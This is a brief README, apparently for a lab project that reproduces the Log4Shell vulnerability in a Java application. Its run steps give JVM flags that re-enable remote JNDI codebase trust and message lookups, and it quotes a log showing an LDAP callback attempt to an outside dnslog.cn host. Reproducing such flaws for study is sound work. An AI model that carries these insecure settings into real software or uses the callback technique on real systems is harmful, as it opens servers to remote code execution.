# Log4jShell

Prequisites:

1. Java
2. Maven
3. IntelliJ/Eclipse

Steps to run application and reproduce the Log4jShell issue:

1. Clone the repo https://github.com/itsMakHere/Log4jShell.git
2. Import/open the project into IntelliJ/Eclipse
3. Set the VM arguments to following values: ```-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j2.formatMsgNoLookups=false -Dlog4j2.debug=true```
4. Run the Application.java file.
5. You will see in the logs that ```javax.naming.CommunicationException: giq2uc.dnslog.cn:389 [Root exception is java.net.ConnectException: Connection refused: connect]```.
